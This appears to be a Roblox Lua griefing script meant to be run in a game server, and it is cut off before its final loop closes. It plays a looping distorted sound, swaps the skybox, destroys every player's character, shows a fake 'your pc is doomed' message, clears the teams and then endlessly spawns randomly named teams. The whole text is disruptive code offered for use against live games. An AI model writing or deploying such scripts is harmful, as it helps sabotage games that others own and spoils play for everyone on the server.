script:
sound = Instance.new("Sound",workspace)
sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
sound.SoundId = "rbxassetid://6674211522"
sound:Play()
sound.Looped = true
repeat
wait(0.01)
until sound.IsLoaded == true
wait(13)
de = Instance.new("DistortionSoundEffect",sound)
de.Level = 0.8
sky = Instance.new("Sky",game:GetService("Lighting"))
sky.SkyboxBk = "http://www.roblox.com/asset/?id=15705773225"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=15705773225"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=15705773225"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=15705773225"
sky.SkyboxUp = "http://www.roblox.com/asset/?id=15705773225"
sky.SkyboxDn = "http://www.roblox.com/asset/?id=15705773225"
sky.CelestialBodiesShown = false
sky.StarCount = 9999999999
getplrs = game:GetService("Players"):GetPlayers()
for i=1, #getplrs do
getplrs[i].Character:Destroy()
end
game:GetService("Lighting").FogEnd = 1000
game:GetService("Lighting").FogStart = 900
game:GetService("Lighting").FogColor = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
msg = Instance.new("Message",workspace)
msg.Text = "oh n0!!?!!looks like your pc is doomed by penguin and k00pkidd??!!?"
findteams = game:FindFirstChild("Teams")
if findteams then
findteams:ClearAllChildren()
end
while true do
wait(0.01)
if findteams then
team = Instance.new("Team",findteams)
team.Name = "hail cXyzkidd?!!!"..tostring(math.random(1,33373))
team.TeamColor = BrickColor.Random()
end
